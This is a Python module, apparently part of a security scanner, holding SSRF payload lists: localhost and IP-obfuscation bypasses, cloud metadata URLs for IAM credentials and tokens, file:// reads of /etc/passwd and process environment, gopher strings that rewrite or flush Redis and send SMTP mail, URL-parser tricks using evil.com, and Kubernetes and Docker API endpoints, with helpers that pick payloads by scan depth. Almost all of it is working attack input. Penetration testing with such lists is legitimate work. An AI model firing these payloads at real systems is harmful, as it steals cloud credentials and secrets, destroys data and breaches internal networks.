"""
SSRF Payloads — Comprehensive library with IP bypass, protocol smuggling,
cloud metadata, and DNS rebinding vectors.
"""

# ── Basic Internal IP Payloads ───────────────────────────────────────────────
BASIC_INTERNAL = [
    'http://127.0.0.1',
    'http://localhost',
    'http://0.0.0.0',
    'http://[::1]',
    'http://0',
    'http://127.1',
    'http://127.0.1',
]

# ── IP Obfuscation Bypass ────────────────────────────────────────────────────
IP_BYPASS = [
    # Decimal notation
    'http://2130706433',                 # 127.0.0.1 as decimal
    'http://017700000001',               # 127.0.0.1 as octal (full)
    # Octal notation
    'http://0177.0.0.1',
    'http://0177.0.0.01',
    'http://0177.0000.0000.01',
    # Hex notation
    'http://0x7f000001',
    'http://0x7f.0x0.0x0.0x1',
    # IPv6
    'http://[::1]',
    'http://[0:0:0:0:0:0:0:1]',
    'http://[::ffff:127.0.0.1]',
    'http://[0000::1]',
    'http://[::1]:80',
    'http://[::1]:443',
    # Mixed formats
    'http://127.0.0.1.nip.io',
    'http://spoofed.burpcollaborator.net',
    'http://localtest.me',
    'http://127.0.0.1:80',
    'http://127.0.0.1:443',
    'http://127.0.0.1:8080',
    'http://127.0.0.1:8443',
    # URL encoding
    'http://%31%32%37%2e%30%2e%30%2e%31',
    # With credentials
    'http://user@127.0.0.1',
    'http://user:pass@127.0.0.1',
    # Redirect tricks
    'http://127.0.0.1#@evil.com',
    'http://evil.com@127.0.0.1',
]

# ── Cloud Metadata Endpoints ─────────────────────────────────────────────────
AWS_METADATA = [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    'http://169.254.169.254/latest/user-data/',
    'http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/',
    'http://169.254.169.254/latest/dynamic/instance-identity/document',
    'http://169.254.169.254/latest/meta-data/hostname',
]

GCP_METADATA = [
    'http://metadata.google.internal/computeMetadata/v1/',
    'http://metadata.google.internal/computeMetadata/v1/instance/',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
    'http://metadata.google.internal/computeMetadata/v1/project/',
]

AZURE_METADATA = [
    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01',
]

DIGITALOCEAN_METADATA = [
    'http://169.254.169.254/metadata/v1/',
    'http://169.254.169.254/metadata/v1/id',
]

ALIBABA_METADATA = [
    'http://100.100.100.200/latest/meta-data/',
    'http://100.100.100.200/latest/meta-data/instance-id',
]

# ── Protocol Smuggling ───────────────────────────────────────────────────────
PROTOCOL_SMUGGLING = [
    'file:///etc/passwd',
    'file:///etc/hosts',
    'file:///proc/self/environ',
    'file:///proc/self/cmdline',
    'file:///c:/windows/win.ini',
    'dict://127.0.0.1:6379/info',
    'gopher://127.0.0.1:25/_HELO',
    'gopher://127.0.0.1:6379/_INFO',
    'ftp://127.0.0.1',
    'tftp://127.0.0.1/test',
    'ldap://127.0.0.1',
]

# ── Internal Port Scanning ───────────────────────────────────────────────────
INTERNAL_PORTS = [
    'http://127.0.0.1:22',      # SSH
    'http://127.0.0.1:23',      # Telnet
    'http://127.0.0.1:25',      # SMTP
    'http://127.0.0.1:80',      # HTTP
    'http://127.0.0.1:443',     # HTTPS
    'http://127.0.0.1:3306',    # MySQL
    'http://127.0.0.1:5432',    # PostgreSQL
    'http://127.0.0.1:6379',    # Redis
    'http://127.0.0.1:27017',   # MongoDB
    'http://127.0.0.1:9200',    # Elasticsearch
    'http://127.0.0.1:11211',   # Memcached
    'http://127.0.0.1:8080',    # Alt HTTP
    'http://127.0.0.1:8443',    # Alt HTTPS
    'http://127.0.0.1:9090',    # Management
    'http://127.0.0.1:5000',    # Flask
    'http://127.0.0.1:3000',    # Node.js
    'http://127.0.0.1:8888',    # Jupyter
]

# ── DNS Rebinding ────────────────────────────────────────────────────────────
DNS_REBINDING = [
    'http://1u.ms/127.0.0.1',
    'http://rbndr.us/dfd8eaba.127.0.0.1',
    'http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.rebind.network',
    'http://make-127-0-0-1-rr.1u.ms',
    'http://www.oast.fun',
    'http://spoofed.burpcollaborator.net',
    'http://rebind.it/rebind?callback=http://169.254.169.254/',
]

# ── IPv6 Advanced ────────────────────────────────────────────────────────────
IPV6_ADVANCED = [
    'http://[::ffff:127.0.0.1]',
    'http://[::ffff:7f00:1]',
    'http://[0:0:0:0:0:ffff:127.0.0.1]',
    'http://[::1]:80',
    'http://[::1]:443',
    'http://[::1]:8080',
    'http://[::ffff:169.254.169.254]',
    'http://[0:0:0:0:0:ffff:a9fe:a9fe]',  # 169.254.169.254 as IPv6
    'http://[::ffff:a9fe:a9fe]',
    'http://[fe80::1%25eth0]',  # Link-local with scope ID
]

# ── URL Parser Differentials ─────────────────────────────────────────────────
URL_PARSER_DIFFERENTIALS = [
    'http://127.0.0.1:80@evil.com',
    'http://evil.com#@127.0.0.1',
    'http://evil.com\\@127.0.0.1',
    'http://127.0.0.1%23@evil.com',
    'http://127.0.0.1:80\\@evil.com',
    'http://foo@127.0.0.1:80@evil.com',
    'http://evil.com:80#@127.0.0.1',
    'http://evil.com:80?@127.0.0.1',
    'http://evil.com\\thing@127.0.0.1',
    'http://ⓔⓥⓘⓛ.ⓒⓞⓜ',  # Unicode domain
    'http://127.0.0.1\\@evil.com',
    'http://127.0.0.1&test.evil.com',
    'http://localhost%00.evil.com',
    'http://127.0.0.1%00@evil.com',
]

# ── Kubernetes / Docker Internal ─────────────────────────────────────────────
K8S_DOCKER = [
    # Kubernetes
    'http://kubernetes.default.svc',
    'http://kubernetes.default.svc:443',
    'http://kubernetes.default.svc.cluster.local',
    'https://kubernetes.default.svc/api/v1/namespaces',
    'https://kubernetes.default.svc/api/v1/pods',
    'https://kubernetes.default.svc/api/v1/secrets',
    'http://10.0.0.1:10250/pods',           # kubelet
    'http://10.0.0.1:10255/pods',           # kubelet read-only
    'http://10.0.0.1:2379/v2/keys/',        # etcd
    'http://10.0.0.1:6443/api',             # API server
    # Docker
    'http://172.17.0.1:2375/info',          # Docker daemon
    'http://172.17.0.1:2375/containers/json',
    'http://172.17.0.1:2375/images/json',
    'http://172.17.0.1:2376/info',          # Docker daemon TLS
    'http://host.docker.internal',
    'http://host.docker.internal:80',
    'http://host.docker.internal:8080',
    # Service mesh
    'http://localhost:15000/config_dump',    # Envoy admin
    'http://localhost:15001',                # Envoy outbound
    'http://127.0.0.1:9901/stats',          # Envoy stats
    'http://consul.service.consul:8500/v1/agent/services',
]

# ── Advanced Cloud Metadata ──────────────────────────────────────────────────
ADVANCED_CLOUD_METADATA = [
    # AWS IMDSv2 (requires token)
    'http://169.254.169.254/latest/api/token',
    'http://169.254.169.254/latest/meta-data/iam/info',
    'http://169.254.169.254/latest/meta-data/local-ipv4',
    'http://169.254.169.254/latest/meta-data/public-ipv4',
    'http://169.254.169.254/latest/meta-data/security-groups/',
    'http://169.254.169.254/latest/meta-data/network/interfaces/',
    'http://169.254.169.254/latest/meta-data/placement/region',
    # AWS ECS
    'http://169.254.170.2/v2/credentials/',
    'http://169.254.170.2/v2/metadata',
    # GCP additional
    'http://metadata.google.internal/computeMetadata/v1/instance/hostname',
    'http://metadata.google.internal/computeMetadata/v1/instance/zone',
    'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
    'http://metadata.google.internal/computeMetadata/v1/instance/attributes/',
    'http://metadata.google.internal/computeMetadata/v1/project/project-id',
    # Azure additional
    'http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
    'http://169.254.169.254/metadata/instance/network?api-version=2021-02-01',
    'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
    'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01',
    # Openstack
    'http://169.254.169.254/openstack/latest/meta_data.json',
    'http://169.254.169.254/openstack/latest/user_data',
    # Oracle Cloud
    'http://169.254.169.254/opc/v2/instance/',
    'http://169.254.169.254/opc/v2/identity/key',
    # Hetzner
    'http://169.254.169.254/hetzner/v1/metadata/hostname',
]

# ── Redirect-Based SSRF ─────────────────────────────────────────────────────
REDIRECT_SSRF = [
    'http://evil.com/redirect?url=http://127.0.0.1',
    'http://evil.com/redirect?url=http://169.254.169.254/',
    'https://httpbin.org/redirect-to?url=http://127.0.0.1',
    'https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/',
    'http://0.0.0.0/redirect?to=http://169.254.169.254/',
]

# ── Gopher Protocol Exploitation ────────────────────────────────────────────
GOPHER_PAYLOADS = [
    # Redis
    'gopher://127.0.0.1:6379/_SET%20pwned%20true%0D%0AQUIT',
    'gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/tmp%0D%0AQUIT',
    'gopher://127.0.0.1:6379/_FLUSHALL%0D%0AQUIT',
    # MySQL (no auth)
    'gopher://127.0.0.1:3306/_SELECT%20version()',
    # SMTP
    'gopher://127.0.0.1:25/_HELO%20evil.com%0D%0AMAIL%20FROM:%3Cattacker@evil.com%3E%0D%0ARCPT%20TO:%3Cvictim@target.com%3E%0D%0ADATA%0D%0ASSRF%20test%0D%0A.',
    # FastCGI
    'gopher://127.0.0.1:9000/_FastCGI',
    # Memcached
    'gopher://127.0.0.1:11211/_stats',
    'gopher://127.0.0.1:11211/_get%20flag',
]

# ── URL Scheme Bypass ────────────────────────────────────────────────────────
SCHEME_BYPASS = [
    'http://127.0.0.1',
    'https://127.0.0.1',
    'HTTP://127.0.0.1',
    'hTtP://127.0.0.1',
    '//127.0.0.1',
    'http:\\\\127.0.0.1',
    'http://127.1/',
    'http://0/',
    'http://0x7f000001/',
    'jar:http://127.0.0.1!/test',
    'netdoc:///etc/passwd',
    'data://127.0.0.1',
]

# ── Internal Network Ranges ─────────────────────────────────────────────────
INTERNAL_RANGES = [
    'http://10.0.0.1',
    'http://10.0.0.1:8080',
    'http://10.0.0.1:8443',
    'http://10.255.255.1',
    'http://172.16.0.1',
    'http://172.16.0.1:8080',
    'http://172.31.255.255',
    'http://192.168.0.1',
    'http://192.168.1.1',
    'http://192.168.1.1:8080',
]

# ── URL-like Parameter Names (extended) ──────────────────────────────────────
URL_PARAM_NAMES = [
    'url', 'uri', 'link', 'src', 'source', 'href', 'redirect',
    'target', 'dest', 'destination', 'next', 'return', 'return_url',
    'callback', 'proxy', 'fetch', 'load', 'file', 'path', 'page',
    'image', 'img', 'feed', 'resource', 'download', 'open', 'read',
    'view', 'from', 'content', 'site', 'host', 'domain', 'api',
    'data', 'endpoint', 'service', 'server', 'report', 'preview',
    'navigate', 'go', 'continue', 'redir', 'ref', 'pdf',
]

# ── Cloud Metadata Indicators ────────────────────────────────────────────────
CLOUD_METADATA_INDICATORS = [
    'ami-id', 'instance-id', 'security-credentials', 'iam',
    'computeMetadata', 'instance/hostname', 'access-token',
    'accountId', 'availabilityZone', 'privateIp',
    'instance-identity', 'user-data', 'metadata',
    'service-accounts', 'project-id',
]

# ── Internal Service Indicators ──────────────────────────────────────────────
INTERNAL_SERVICE_INDICATORS = [
    'openssh', 'mysql', 'redis', 'apache', 'nginx', 'iis', 'tomcat',
    'ftp', 'smtp', 'pop3', 'elasticsearch', 'rabbitmq', 'memcached',
    'mongodb', 'postgresql', 'docker', 'kubernetes', 'consul',
]


def get_all_ssrf_payloads() -> list:
    """Return all SSRF payloads combined."""
    return (
        BASIC_INTERNAL + IP_BYPASS + AWS_METADATA + GCP_METADATA +
        AZURE_METADATA + DIGITALOCEAN_METADATA + ALIBABA_METADATA +
        PROTOCOL_SMUGGLING + INTERNAL_PORTS + DNS_REBINDING +
        IPV6_ADVANCED + URL_PARSER_DIFFERENTIALS + K8S_DOCKER +
        ADVANCED_CLOUD_METADATA + REDIRECT_SSRF + GOPHER_PAYLOADS +
        SCHEME_BYPASS + INTERNAL_RANGES
    )


def get_ssrf_payloads_by_depth(depth: str) -> list:
    """Return depth-appropriate SSRF payloads."""
    if depth == 'shallow':
        return BASIC_INTERNAL[:4] + AWS_METADATA[:2]
    elif depth == 'medium':
        return (BASIC_INTERNAL + IP_BYPASS[:8] + AWS_METADATA +
                GCP_METADATA[:2] + AZURE_METADATA[:1] + INTERNAL_PORTS[:5] +
                K8S_DOCKER[:5] + DNS_REBINDING[:3] + IPV6_ADVANCED[:3])
    else:  # deep
        return get_all_ssrf_payloads()
